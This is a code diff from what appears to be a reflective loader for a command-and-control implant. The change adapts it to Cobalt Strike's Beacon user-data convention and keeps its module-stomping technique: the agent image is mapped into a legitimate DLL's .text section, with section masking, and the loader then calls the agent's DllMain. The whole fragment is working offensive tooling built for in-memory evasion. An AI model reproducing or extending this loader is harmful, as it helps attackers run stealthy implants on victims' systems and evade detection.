@@ -271,46 +271,43 @@ FUNC VOID Main(
 
     Instance()->Win32.NtFlushInstructionCache( (HANDLE)-1, MappedBase, ImageSize );
 
-    /* ── Populate UDRL_USER_DATA ── */
+    /* ── Populate CS USER_DATA + ALLOCATED_MEMORY ── */
 
-    UDRL_USER_DATA *Ud = Instance()->Win32.VirtualAlloc(
-        NULL, sizeof(UDRL_USER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    SIZE_T udSize = sizeof(USER_DATA) + sizeof(ALLOCATED_MEMORY);
+    PBYTE UdBuf = Instance()->Win32.VirtualAlloc(
+        NULL, udSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
-    if ( Ud ) {
-        MmZero( Ud, sizeof(UDRL_USER_DATA) );
-        Ud->magic = UDRL_MAGIC;
+    if ( UdBuf ) {
+        MmZero( UdBuf, udSize );
 
-        Ud->load_type         = LOAD_TYPE_MODULE_STOMP;
-        Ud->agent_base        = MappedBase;
-        Ud->agent_size        = ImageSize;
-        Ud->loader_base       = Instance()->Base.Buffer;
-        Ud->loader_size       = Instance()->Base.Length;
-        Ud->stomped_module    = StompedModule;
-        Ud->stomped_text_base = StompedText;
-        Ud->stomped_text_size = StompedTextSz;
+        USER_DATA *Ud             = (USER_DATA *)UdBuf;
+        ALLOCATED_MEMORY *AllocMem = (ALLOCATED_MEMORY *)(UdBuf + sizeof(USER_DATA));
 
-        /* Region 0: stomped .text that holds the mapped agent image */
-        Ud->regions[0].base    = StompedText;
-        Ud->regions[0].size    = StompedTextSz;
-        Ud->regions[0].protect = PAGE_EXECUTE_READ;
+        Ud->version         = STARBURST_VERSION;
+        Ud->allocatedMemory = AllocMem;
 
-        /* Region 1: this user data allocation */
-        Ud->regions[1].base    = Ud;
-        Ud->regions[1].size    = sizeof(UDRL_USER_DATA);
-        Ud->regions[1].protect = PAGE_READWRITE;
+        /* Region 0: Beacon memory via module stomp */
+        AllocMem->AllocatedMemoryRegions[0].Purpose       = PURPOSE_BEACON_MEMORY;
+        AllocMem->AllocatedMemoryRegions[0].AllocationBase = MappedBase;
+        AllocMem->AllocatedMemoryRegions[0].RegionSize     = ImageSize;
 
-        Ud->region_count = 2;
+        AllocMem->AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_MODULESTOMP;
+        AllocMem->AllocatedMemoryRegions[0].CleanupInformation.AdditionalCleanupInformation.ModuleStompInfo.ModuleHandle = StompedModule;
 
-        GenerateRc4Key( Ud->rc4_key );
-    }
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].Label          = LABEL_TEXT;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].BaseAddress    = StompedText;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].VirtualSize    = StompedTextSz;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_EXECUTE_READ;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].MaskSection    = TRUE;
 
-    /* ── Call DllMain ── */
+        /* Transfer execution via CS DLL_BEACON_USER_DATA convention */
+        typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );
 
-    typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );
-
-    DWORD EntryRva = Nt->OptionalHeader.AddressOfEntryPoint;
-    if ( EntryRva ) {
-        fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
-        pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, (LPVOID)Ud );
+        DWORD EntryRva = Nt->OptionalHeader.AddressOfEntryPoint;
+        if ( EntryRva ) {
+            fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
+            pDllMain( (HINSTANCE)MappedBase, DLL_BEACON_USER_DATA, (LPVOID)Ud );
+            pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, NULL );
+        }
     }
 }
